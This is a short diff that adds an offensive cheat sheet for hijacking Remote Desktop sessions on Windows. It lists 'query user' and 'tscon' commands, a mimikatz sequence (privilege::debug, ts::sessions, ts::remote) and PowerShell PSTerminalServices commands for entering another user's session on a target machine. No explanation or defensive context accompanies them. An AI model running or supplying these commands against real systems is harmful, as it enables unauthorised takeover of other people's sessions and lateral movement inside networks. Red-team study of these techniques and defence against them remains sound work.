@@ -1,0 +1,19 @@
+
+-----see users
+query user
+tscon <SESSION_ID> /dest:<SESSION_NAME>
+
+
+
+------RDPhijacking by mimikatz
+mimikatz.exe
+privilege::debug
+ts::sessions
+ts::remote /id:<SESSION_ID>
+
+------RDPhijacking by powershell
+Import-Module PSTerminalServices
+Get-TSSession -ComputerName <TARGET>
+Enter-TSSession -ComputerName <TARGET> -SessionId <ID>
+
+
